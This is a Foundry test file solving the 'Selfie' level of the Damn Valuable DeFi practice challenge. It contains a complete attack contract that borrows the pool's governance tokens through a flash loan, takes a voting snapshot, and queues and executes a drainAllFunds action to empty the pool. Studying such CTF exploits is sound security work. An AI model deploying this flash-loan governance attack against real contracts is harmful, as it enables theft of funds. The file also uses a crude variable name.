// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import { DSTest } from "ds-test/test.sol";
import { Utilities } from "../../utils/Utilities.sol";
import { console } from "../../utils/Console.sol";
import { Vm } from "forge-std/Vm.sol";

import { DamnValuableTokenSnapshot } from "../../../Contracts/DamnValuableTokenSnapshot.sol";
import { SimpleGovernance } from "../../../Contracts/selfie/SimpleGovernance.sol";
import { SelfiePool } from "../../../Contracts/selfie/SelfiePool.sol";

contract Penetrator {
  SimpleGovernance private gov;
  SelfiePool private pool;
  DamnValuableTokenSnapshot private dvts;
  address private owner;
  uint256 public actionId;

  constructor(SelfiePool _pool, DamnValuableTokenSnapshot _dvts) {
    owner = msg.sender;
    pool = _pool;
    dvts = _dvts;
    gov = _pool.governance();
  }

  function ebi() external {
    uint256 poolBalance = dvts.balanceOf(address(pool));
    pool.flashLoan(poolBalance);
    dvts.approve(owner, poolBalance);
  }

  function receiveTokens(address _dvts, uint256 _amount) external {
    bytes memory payload = abi.encodeWithSignature(
      "drainAllFunds(address)",
      address(this)
    );

    dvts.snapshot();
    actionId = gov.queueAction(address(pool), payload, 0);

    DamnValuableTokenSnapshot(_dvts).transfer(address(pool), _amount);
  }
}

contract Selfie is DSTest {
  Vm internal immutable vm = Vm(HEVM_ADDRESS);

  uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
  uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

  Utilities internal utils;
  SimpleGovernance internal simpleGovernance;
  SelfiePool internal selfiePool;
  DamnValuableTokenSnapshot internal dvtSnapshot;
  address payable internal attacker;

  function setUp() public {
    utils = new Utilities();
    address payable[] memory users = utils.createUsers(1);
    attacker = users[0];

    vm.label(attacker, "Attacker");

    dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
    vm.label(address(dvtSnapshot), "DVT");

    simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
    vm.label(address(simpleGovernance), "Simple Governance");

    selfiePool = new SelfiePool(
      address(dvtSnapshot),
      address(simpleGovernance)
    );

    dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

    assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

    console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
  }

  function testExploit() public {
    /** EXPLOIT START **/
    vm.startPrank(attacker);
    Penetrator penis = new Penetrator(selfiePool, dvtSnapshot);
    penis.ebi();
    vm.warp(block.timestamp + 2 days);
    simpleGovernance.executeAction(penis.actionId());
    uint256 totalAmount = dvtSnapshot.balanceOf(address(penis));
    dvtSnapshot.transferFrom(address(penis), attacker, totalAmount);
    vm.stopPrank();
    /** EXPLOIT END **/
    validation();
  }

  function validation() internal {
    // Attacker has taken all tokens from the pool
    assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
    assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
  }
}
